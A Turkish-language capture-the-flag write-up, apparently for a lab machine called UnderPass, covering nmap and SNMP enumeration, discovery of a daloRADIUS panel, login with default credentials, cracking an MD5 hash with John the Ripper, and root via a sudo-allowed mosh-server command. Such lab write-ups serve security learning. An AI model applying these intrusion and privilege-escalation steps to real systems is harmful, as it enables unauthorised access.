---
{"dg-publish":true,"permalink":"/ctf/under-pass-ctf/"}
---


### NMAP

```
nmap -p- --min-rate 10000 10.10.11.48
```

![Pasted image 20250117145427.png](/img/user/resimler/Pasted%20image%2020250117145427.png)

```
nmap -p 22,80 -sCV 10.10.11.48 
```

![Pasted image 20250117145907.png](/img/user/resimler/Pasted%20image%2020250117145907.png)

```
nmap -sU 10.10.11.48 -T5
```

![Pasted image 20250117155825.png](/img/user/resimler/Pasted%20image%2020250117155825.png)

**UDP 161 açık bir port olarak görülür ve burada bir SNMP servisi çalıştığı anlaşılır!**

SNMP (Simple Network Management Protocol), ağ cihazlarının yönetimi için kullanılan bir protokoldür. İletişim genellikle UDP port 161 üzerinden gerçekleşir. Yönetim tarafı, sorgulamalarını bu port üzerinden gerçekleştirirken, client tarafı UDP port 162'yi kullanır.


## SNMP-check

steve@underpass.htb kullanıcı adının mevcut olduğu ve bir **daloradius** servisinin bulunduğu görülebilir.

Github üzerinde, muhtemel bir yol olan **/var/www/daloradius** keşfettim.<

![Pasted image 20250117160649.png](/img/user/resimler/Pasted%20image%2020250117160649.png)

daloRADIUS, etkin noktaları ve genel amaçlı ISP dağıtımlarını yönetmek için gelişmiş bir RADIUS web yönetim uygulamasıdır. Kullanıcı yönetimi, grafik raporlama, muhasebe, faturalandırma motoru özelliklerine sahiptir ve coğrafi konum için OpenStreetMap ile entegre olur. Sistem, backend veritabanına erişimi paylaştığı FreeRADIUS'a dayanmaktadır.

![Pasted image 20250117175542.png](/img/user/resimler/Pasted%20image%2020250117175542.png)

github sayfasını incelediğimizde .php uzantılı sersileri kullandığını web sitesinin backend'inin muhtemelen PHP ile yazıldığı sonucuna ulaşabiliriz. Apache - PHP - Muhtemelen database'ide mysql olmalıdır. 

## Dirsearch

![Pasted image 20250117163329.png](/img/user/resimler/Pasted%20image%2020250117163329.png)

Docker-compose.yml dosyasına göz atın

![Pasted image 20250117163425.png](/img/user/resimler/Pasted%20image%2020250117163425.png)

```
cat docker-compose.yml 
version: "3"

services:

  radius-mysql:
    image: mariadb:10
    container_name: radius-mysql
    restart: unless-stopped
    environment:
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      - MYSQL_ROOT_PASSWORD=radiusrootdbpw
    volumes:
      - "./data/mysql:/var/lib/mysql"

  radius:
    container_name: radius
    build:
      context: .
      dockerfile: Dockerfile-freeradius
    restart: unless-stopped
    depends_on: 
      - radius-mysql
    ports:
      - '1812:1812/udp'
      - '1813:1813/udp'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional settings
      - DEFAULT_CLIENT_SECRET=testing123
    volumes:
      - ./data/freeradius:/data
    # If you want to disable debug output, remove the command parameter
    command: -X

  radius-web:
    build: .
    container_name: radius-web
    restart: unless-stopped
    depends_on:
      - radius
      - radius-mysql
    ports:
      - '80:80'
      - '8000:8000'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional Settings:
      - DEFAULT_CLIENT_SECRET=testing123
      - DEFAULT_FREERADIUS_SERVER=radius
      - MAIL_SMTPADDR=127.0.0.1
      - MAIL_PORT=25
      - MAIL_FROM=root@daloradius.xdsl.by
      - MAIL_AUTH=

    volumes:
      - ./data/daloradius:/data
                                         
```

Görünüşe göre bazı ortam bilgileri (**environment**) mevcut.

Gelişmiş bir dizin ve uzantı taraması yapalım . 

![Pasted image 20250117175750.png](/img/user/resimler/Pasted%20image%2020250117175750.png)

Elde ettiğimiz sonuçlar. 

```
──────────────────────────────────────────────────
http://10.10.11.48/daloradius/library 301 http://10.10.11.48/daloradius/doc 301 http://10.10.11.48/daloradius/contrib 301 http://10.10.11.48/daloradius/app 301 http://10.10.11.48/daloradius/setup 301 http://10.10.11.48/daloradius/contrib/scripts 301 http://10.10.11.48/daloradius/contrib/db 301 http://10.10.11.48/daloradius/app/common 301 http://10.10.11.48/daloradius/app/users 301 http://10.10.11.48/daloradius/app/users/logout.php 302 http://10.10.11.48/daloradius/app/users/static/images/favicon/ 302 http://10.10.11.48/daloradius/app/users/static/js/bootstrap.bundle.min.js 200 http://10.10.11.48/daloradius/app/users/static 301 http://10.10.11.48/daloradius/app/users/lang 301 http://10.10.11.48/daloradius/app/users/index.php 302 http://10.10.11.48/daloradius/app/users/include 301 http://10.10.11.48/daloradius/app/users/static/images/ 302 http://10.10.11.48/daloradius/app/users/static/css/icons/bootstrap-icons.min.css 200 
http://10.10.11.48/daloradius/app/users/login.php 200 http://10.10.11.48/daloradius/app/users/library 301 http://10.10.11.48/daloradius/app/users/lang/en.php 302 http://10.10.11.48/daloradius/app/users/lang/it.php 302 http://10.10.11.48/daloradius/app/users/lang/ru.php 302 http://10.10.11.48/daloradius/app/users/lang/main.php 200 http://10.10.11.48/daloradius/app/users/static/index.php 302 http://10.10.11.48/daloradius/app/users/static/images 301 http://10.10.11.48/daloradius/app/users/static/js 301 http://10.10.11.48/daloradius/app/users/static/css 301 http://10.10.11.48/daloradius/app/users/include/common 301 http://10.10.11.48/daloradius/app/users/include/config 301 http://10.10.11.48/daloradius/app/users/include/menu 301 http://10.10.11.48/daloradius/app/common/library 301 http://10.10.11.48/daloradius/app/users/library/javascript 301 http://10.10.11.48/daloradius/app/common/static 301 http://10.10.11.48/daloradius/app/users/include/management 301 http://10.10.11.48/daloradius/app/users/library/tables 301 http://10.10.11.48/daloradius/app/operators 301 http://10.10.11.48/daloradius/app/operators/logout.php 302 http://10.10.11.48/daloradius/app/operators/include 301 http://10.10.11.48/daloradius/app/operators/static 301 http://10.10.11.48/daloradius/app/operators/lang 301 http://10.10.11.48/daloradius/app/operators/library 301 http://10.10.11.48/daloradius/app/operators/static/index.php 302 http://10.10.11.48/daloradius/app/operators/lang/en.php 302 http://10.10.11.48/daloradius/app/operators/include/common 301 http://10.10.11.48/daloradius/app/operators/heartbeat.php 200                                           
```

En dikkat çekicileri 

- **`/daloradius/app/operators/heartbeat.php` (200 OK)** - Sistemin durumunu kontrol eden bir dosya, güvenlik açığı olabilir.
- **`/daloradius/app/users/logout.php` (302 Redirect)** - Oturum yönetimi zafiyeti olabilir.
- **`/daloradius/app/users/index.php` (302 Redirect)** - Giriş sayfası, kimlik doğrulama sorunları olabilir.
- **`/daloradius/app/users/lang/en.php` (302 Redirect)** - Dil dosyaları, yapılandırma bilgileri içerebilir.
- **`/daloradius/app/users/library/javascript` (301 Moved Permanently)** - JavaScript dosyaları XSS zafiyetlerine yol açabilir.
- **`/daloradius/app/users/static/js/bootstrap.bundle.min.js` (200 OK)** - Eski veya hatalı yapılandırılmış JS kütüphanesi güvenlik açığı oluşturabilir.


![Pasted image 20250117180642.png](/img/user/resimler/Pasted%20image%2020250117180642.png)

Daha sonra /daloradius/doc/install/INSTALL içinde sürüm bilgilerini ve varsayılan kullanıcı adı ve parolayı buldum

![Pasted image 20250117181337.png](/img/user/resimler/Pasted%20image%2020250117181337.png)

![Pasted image 20250117181341.png](/img/user/resimler/Pasted%20image%2020250117181341.png)

"/app/user" dizininden doğrudan giriş yapılamadığı için, "/app" dizini üzerinde daha kapsamlı bir tarama yapmayı deneyin, varsayılan sözlüğü kullanmayın.

Varsayılan parola ile /app/operators adresinden backend'e giriş yapın

![Pasted image 20250117181634.png](/img/user/resimler/Pasted%20image%2020250117181634.png)

## MD5 Crack

Kullanıcı listesinde Parola'nın MD5 değerini bulun.

![Pasted image 20250117181715.png](/img/user/resimler/Pasted%20image%2020250117181715.png)

"underwaterfriends"

John the Ripper'ı kullanarak veya Hashcat kullanarak da bu sonuca ulaşabilirsiniz. 

```
john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

user.txt dosyasını almak için ssh girişi yapın


![Pasted image 20250117181911.png](/img/user/resimler/Pasted%20image%2020250117181911.png)

![Pasted image 20250117192113.png](/img/user/resimler/Pasted%20image%2020250117192113.png)

## Privilege Escalation

sudo -l ile çalıştırabilidiğimiz programlara bakalım . 

![Pasted image 20250117192231.png](/img/user/resimler/Pasted%20image%2020250117192231.png)


![Pasted image 20250117193440.png](/img/user/resimler/Pasted%20image%2020250117193440.png)

Gördüğünüz gibi, --server komutu varsayılan olarak mosh-server'ı seçer, bu da mevcut kullanıcının superprivileges'e sahip olduğu komuttur.

Böylece kendi sunucunuza bağlanabilirsiniz

```
mosh --server="sudo /usr/bin/mosh-server" localhost
```

![Pasted image 20250117193930.png](/img/user/resimler/Pasted%20image%2020250117193930.png)
